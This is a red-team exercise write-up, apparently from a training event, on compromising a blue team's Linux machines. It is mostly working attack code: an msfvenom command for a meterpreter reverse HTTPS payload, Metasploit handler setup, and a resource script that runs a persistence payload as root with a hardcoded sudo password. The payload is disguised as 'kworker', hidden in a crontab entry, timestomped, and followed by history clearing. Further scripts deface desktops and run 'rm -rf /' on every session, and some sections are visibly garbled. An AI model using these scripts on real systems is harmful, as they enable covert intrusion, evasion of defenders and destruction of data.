## <a name="scenario">Scenario</a>

We were told to create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal was to stealthily persist as many systems as possilble day one. Day two, if we still had any persistence, we were to make our presence known to the defenders.(EX: Change background, delete firewall rules and remove files)

### Hints   

* Linux x64   
* firewall is up but systems require 80,443,53 outbound


## <a name="payload">Creating your Payload<a/>

There are many ways to create a payload, but one of the easiest is by using msfvenom.  
Finding a payload to use can be done by listing all payloads with `msfvenom -l payloads`   
We can further filter this down to fit our requirements by piping this to grep.   

```console
root@kali:~# msfvenom -l payloads | grep linux/x64
    linux/x64/exec                                      Execute an arbitrary command                               
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)
    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)       
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection    
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell    
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell          
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.                                                                 
    linux/x64/shell_find_port                           Spawn a shell on an established connection                 
    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```    

From this we can see that `linux/x64/meterpreter_reverse_https` would be a good payload to use.

Evasion options for payload/linux/x64/meterpreter_reverse_https:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

You can see that the Basic options of LHOST and LPORT are required. To input these options, you put the variables in after the payload, before the next argument.   
`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=8443 LHOST=10.0.0.1`   

After this, other important arguments are:   
```
--arch              # Set Architecture    
--platform          # Set Platform   
-f                  # Set Format   
-e                  # Set Encoders   
-o                  # Set Outfile   
```
All of these arguments can be used with --list to show valid options.   

For our scenario, -f elf was used.

The final command should look as follows:   
```console
root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1 -f elf -o reverse_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1046512 bytes
Final size of elf file: 1046512 bytes
Saved as: reverse_shell
```


## <a name="callback">Receiving our Callback<a/>

First we will need to allow traffic through our redirector to receive our payloads.  For a reference on how to do this, visit my [Redirector](https://github.com/vipertooth/Notes/blob/master/digitalocean/redirector.md) and [Iptables](https://github.com/vipertooth/Notes/blob/master/digitalocean/setup.md#setting-up-iptables-rules) writeups.   

To catch our callback, we will use Metasploit. To start Metasploit, run msfconsole.

```console

msf5 > 
```

The module we will use is called the multi/handler.  This is a module that is used to receive any callbacks.  Then set the payload to match our payload.

```console
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_https
payload => linux/x64/meterpreter_reverse_https
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```

Then set the LHOST and LPORT.  This would normally be enough to receive the callback, however in this scenario we will be getting multiple callbacks.  To fix this, we will need to change the advanced setting ExitOnSession to false and run the handler as a job.

```console
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://0.0.0.0:8443
msf5 exploit(multi/handler) > jobs

This will leave us with 8 possible methods for gaining persistence on our targets. We will want to view each of these to see what method to use.  This can be done with the info command.

Payload information:
  Avoid: 4 characters

Description:
  This module will create a cron or crontab entry to execute a 
  payload. The module includes the ability to automatically clean up 
  those entries to prevent multiple executions. syslog will get a copy 
  of the cron entry.
  ```
  
We decided to use this module during testing.  We found that it worked, however it was very easy to notice that there was an adversary on the box and where to find his persistence.  Instead, we decided to use a custom exploit based on this module.
  
To do that we created a resource file for Metasploit that will upload a payload and execute it.

#### Resource file    
uploadandrun.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading file to session #{num}")
session.fs.file.upload_file("/tmp/AutoPWN","AutoPWN")
print_status("Uploaded, Executing AutoPWN")
session.sys.process.execute("/bin/bash", "-c 'chmod +x /tmp/AutoPWN && echo \"password!\" | sudo -S bash -c \"/tmp/AutoPWN\"'", {'Hidden' => true, 'Channelized' => false})
print_status("Successful AutoPWN on session #{num}")
end
</ruby>
```

This file will upload the file AutoPWN to the tmp directory on each of the sessions that are currently open.  Then it will make the file executable and execute the file as root.

#### Payload file    
AutoPWN    
```bash
#!/bin/bash
find / -name kworker -exec cp -t /sbin/ {} +
echo " " >> /etc/crontab
echo "#Required for Kryptos Operations" >> /etc/crontab
echo "0,30 * * * * root kworker" >> /etc/crontab
touch -r /sbin/route /sbin/kworker
rm /tmp/AutoPWN
history -c
sleep 60 && kworker
```

This payload will find the Meterpreter payload that I created and copy it to /sbin/.  Then it will write into the crontab the job to run my payload every 30 min.  It also put in a note about how it is required so the blue team might overlook it.  Then it will change the file modification date with the touch command so the exploit will have the same date as route.  This will make it harder to find.  Finally it will clean up the payload file, clear history, and launch the Meterpreter payload as root.

## <a name="disruption">Disruption<a/>   

To disrupt the blue team, we changed the background and played music.

To change the background we ran a resource file:   
mass-background-change.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading Image to session #{num}")
session.fs.file.upload_file("/tmp/.Flag.jpg","Flag.jpg")
print_status("Uploaded, Changing Background")
session.sys.process.execute("/bin/bash", "-c 'gsettings set org.gnome.desktop.background picture-uri file:///tmp/.Flag.jpg'", {'Hidden' => true, 'Channelized' => false})
print_status("Successfully changed Background on session #{num}")
end
</ruby>
```

To play music again, we ran a resource file:   
mass-audio-rickroll.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading Image to session #{num}")
session.fs.file.upload_file("/tmp/rick.wav","rick.wav")
print_status("Uploaded")
session.sys.process.execute("/bin/bash", "-c 'amixer set "Master" 100%'", {'Hidden' => true, 'Channelized' => false})
print_status("Set volume to max")
session.sys.process.execute("/bin/bash", "-c 'aplay /tmp/rick.wav'", {'Hidden' => true, 'Channelized' => false})
print_status("Rick Rolling session #{num}")
end
</ruby>
```

## <a name="destruction">Destruction<a/>

To destroy all remaining systems, we also ran a resource file:   
mass-destruction.rc  
```ruby
<ruby>
framework.sessions.each do |num,session|
session.sys.process.execute("/bin/bash", "-c 'rm -rf /'", {'Hidden' => true, 'Channelized' => false})
print_status("Destroying session #{num})
end
</ruby>
```
